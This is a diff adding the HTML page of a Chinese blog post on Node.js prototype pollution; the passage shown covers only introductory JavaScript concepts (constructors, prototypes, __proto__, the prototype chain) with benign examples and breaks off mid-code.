@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Nodejs原型污染 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, nodejs安全' />
+  <meta itemprop="name" content="nodejs原型污染">
+  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
+  <meta itemprop="wordCount" content="1342">
+  <meta itemprop="keywords" content="代码审计,Nodejs安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/nodejs%E5%AE%89%E5%85%A8/18/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="nodejs原型污染">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Nodejs安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="nodejs原型污染">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/nodejs%E5%AE%89%E5%85%A8/18/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/nodejs%E5%AE%89%E5%85%A8/17/" /><link rel="next" href="https://dongyu29.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%B3%BB%E7%BB%9F/nginx/89/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "nodejs原型污染",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/nodejs%E5%AE%89%E5%85%A8\/18\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, nodejs安全","wordcount":  1342 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/nodejs%E5%AE%89%E5%85%A8\/18\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Nodejs原型污染</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Nodejs原型污染</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1342 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="相关概念" class="heading-element"><span>0.0.0.1  相关概念</span>
+  <a href="#%e7%9b%b8%e5%85%b3%e6%a6%82%e5%bf%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>所有的对象都继承自Object.prototype，包括{ “a”: 1, “b”: 2 }这样的对象。</p>
+<p>Object.prototype是JavaScript中所有对象的原型对象，它是一个内置的对象，提供了一些通用的属性和方法，比如toString()和hasOwnProperty()等。</p>
+<h6 id="构造函数" class="heading-element"><span>0.0.0.1.1  构造函数</span>
+  <a href="#%e6%9e%84%e9%80%a0%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在JavaScript中，可以使用==构造函数==的方式来定义一个类。构造函数是一个特殊的方法，在创建类的新实例时自动调用，用于初始化对象的属性。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Foo</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">bar</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">1</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">Foo</span>()</span></span></code></pre></div><p>Foo函数的内容 就是 Foo类的构造函数 而this.bar 就是 Foo类的一个属性</p>
+<blockquote>
+<p>请注意，与使用<code>class</code>关键字定义类不同，==使用构造函数方式定义的类，每次创建新的实例时，都会为每个实例创建一个新的函数对象==。因此，在具有大量实例的情况下，使用<code>class</code>定义类通常更高效。</p>
+<p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p>
+</blockquote>
+<h6 id="原型" class="heading-element"><span>0.0.0.1.2  原型</span>
+  <a href="#%e5%8e%9f%e5%9e%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>==原型就是一个属性，即prototype属性，这个属性是构造函数的属性==，构造函数时用来制造出对象的。是构造函数制造出来的公共祖先，后面所有的对象都会继承原型的属性与方法。而后面会提到的<code>_proto_</code>是用来查看原型的，是对象的属性。</p>
+<p>为何要有原型这个东西？</p>
+<ul>
+<li>使用构造函数方式定义的类，每次创建新的实例时，都会为每个实例创建一个新的函数对象。通过原型的机制，可以避免对象之间重复定义相同的方法，而是将方法定义在原型上以实现方法的共享和继承。</li>
+</ul>
+<p>下面是一个简单的例子来演示原型的使用：</p>
+<p>一个类中 必然有一些方法 类似 属性this.bar 我们也可以将方法 定义再构造函数内部</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Foo</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">bar</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">show</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">function</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#ff636f">this</span>.<span style="color:#58a1dd">bar</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">Foo</span>()).<span style="color:#58a1dd">show</span>()</span></span></code></pre></div><p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>
+<p>我希望 在创建类的时候 只创建一次 show方法 这时候就要使用 ==prototype==(原型对象)了。这就印证了我们上面说的为何要有原型这个东西。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Person</span>(<span style="color:#58a1dd">name</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">name</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Person</span>.<span style="color:#58a1dd">prototype</span>.<span style="color:#58a1dd">greet</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">function</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">`Hello, my name is </span><span style="color:#a6be9d">${</span><span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">.`</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">john</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Person</span>(<span style="color:#a6be9d">&#39;John&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">john</span>.<span style="color:#58a1dd">greet</span>(); <span style="color:#828b96;font-style:italic">// 输出：Hello, my name is John.
+</span></span></span></code></pre></div><p>在上面的例子中，我们定义了一个构造函数 <code>Person</code>，并设置了一个 <code>name</code> 属性。然后，我们通过 <code>Person.prototype</code> 来定义 <code>greet</code> 方法。这样，通过 <code>new</code> 关键字创建的 <code>Person</code> 的实例 <code>john</code> 就==继承==了 <code>greet</code> 方法。</p>
+<p>因此，我们可以在 <code>john</code> 对象上调用 <code>greet</code> 方法，输出一条问候语。</p>
+<h6 id="原型对象" class="heading-element"><span>0.0.0.1.3  原型对象</span>
+  <a href="#%e5%8e%9f%e5%9e%8b%e5%af%b9%e8%b1%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>每个对象都具有一个特殊属性<code>__proto__</code>（非标准）或者<code>[[Prototype]]</code>，它指向对象的原型对象。实际上可以理解为原型对象和原型是一个东西。只是我们用<code>__proto__</code>的方法访问prototype</p>
+<blockquote>
+<p>到这里不要犯迷糊，prototype这个属性是构造函数的属性，而这里的<code>__proto__</code>或者<code>[[Prototype]]</code>是对象的属性，可以用它访问原型对象。</p>
+</blockquote>
+<p>实际上，原型对象也是一个普通的对象，它可以拥有自己的原型对象，形成原型链。</p>
+<p>下面是一个示例来说明原型对象的概念：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Person</span>(<span style="color:#58a1dd">name</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">name</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Person</span>.<span style="color:#58a1dd">prototype</span>.<span style="color:#58a1dd">sayHello</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">function</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">`Hello, my name is </span><span style="color:#a6be9d">${</span><span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">.`</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">john</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Person</span>(<span style="color:#a6be9d">&#39;John&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//注意这两个true
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">john</span>.<span style="color:#58a1dd">__proto__</span> <span style="color:#ff636f">===</span> <span style="color:#58a1dd">Person</span>.<span style="color:#58a1dd">prototype</span>); <span style="color:#828b96;font-style:italic">// 输出：true
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">Object</span>.<span style="color:#58a1dd">getPrototypeOf</span>(<span style="color:#58a1dd">john</span>) <span style="color:#ff636f">===</span> <span style="color:#58a1dd">Person</span>.<span style="color:#58a1dd">prototype</span>); <span style="color:#828b96;font-style:italic">// 输出：true
+</span></span></span></code></pre></div><p>通过 <code>__proto__</code> 或者 <code>Object.getPrototypeOf()</code> 方法，我们可以获取到对象的原型对象。</p>
+<p>需要注意的是，虽然可以直接通过 <code>__proto__</code> 属性访问对象的原型对象，在实际开发中，不推荐直接使用 <code>__proto__</code>，而是使用 <code>Object.getPrototypeOf()</code> 方法，它提供了更好的可读性和兼容性。</p>
+<h6 id="原型链" class="heading-element"><span>0.0.0.1.4  原型链</span>
+  <a href="#%e5%8e%9f%e5%9e%8b%e9%93%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>==原型链是一种继承的手段。==</p>
+<p>当前对象 -&gt; 对象的原型 -&gt; 原型的原型 -&gt; &hellip;</p>
+</blockquote>
+<p>由于<code>_proto_</code>是任何对象都有的属性，而js里万物皆对象，所以会形成一条<code>_proto_</code>连起来的链条，最终指向一个特殊的对象<code>null</code>。</p>
+<p>当我们访问对象的某个属性或方法时，如果该对象本身没有这个属性或方法，JavaScript 引擎会沿着原型链向上查找，直到找到对象最顶层的原型对象，或者找到该属性或方法为止。</p>
+<p>以下是一个示例来说明原型链的概念：</p>
+<p>例1</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Father</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">first_name</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;Donald&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">last_name</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;Trump&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Son</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">first_name</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;Melania&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Son</span>.<span style="color:#58a1dd">prototype</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Father</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">son</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Son</span>()
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">`Name: </span><span style="color:#a6be9d">${</span><span style="color:#58a1dd">son</span>.<span style="color:#58a1dd">first_name</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d"> </span><span style="color:#a6be9d">${</span><span style="color:#58a1dd">son</span>.<span style="color:#58a1dd">last_name</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">`</span>)</span></span></code></pre></div><p>Son类 继承了 Father类的last_name 属性 最后输出的 是 <code>Name: Melania Trump</code></p>
+<p>对于对象 son 在调用 son.last_name 的时候 实际上 JavaScript 引擎 会进行如下 操作</p>
+<ol>
+<li>在对象son中寻找 last_name</li>
+<li>找不到 则在son.<strong>proto</strong> 中寻找last_name</li>
+<li>如果 仍然找不到 则继续在son.<strong>proto</strong>.<strong>proto</strong> 中寻找last_name</li>
+<li>依次寻找 直到找到null 结束 比如 Object.prototype 的 <strong>proto</strong>都是 null</li>
+</ol>
+<p>例2</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Person</span>(<span style="color:#58a1dd">name</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">name</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Person</span>.<span style="color:#58a1dd">prototype</span>.<span style="color:#58a1dd">greet</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">function</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">`Hello, my name is </span><span style="color:#a6be9d">${</span><span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">.`</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Student</span>(<span style="color:#58a1dd">name</span>, <span style="color:#58a1dd">grade</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#58a1dd">Person</span>.<span style="color:#58a1dd">call</span>(<span style="color:#ff636f">this</span>, <span style="color:#58a1dd">name</span>);
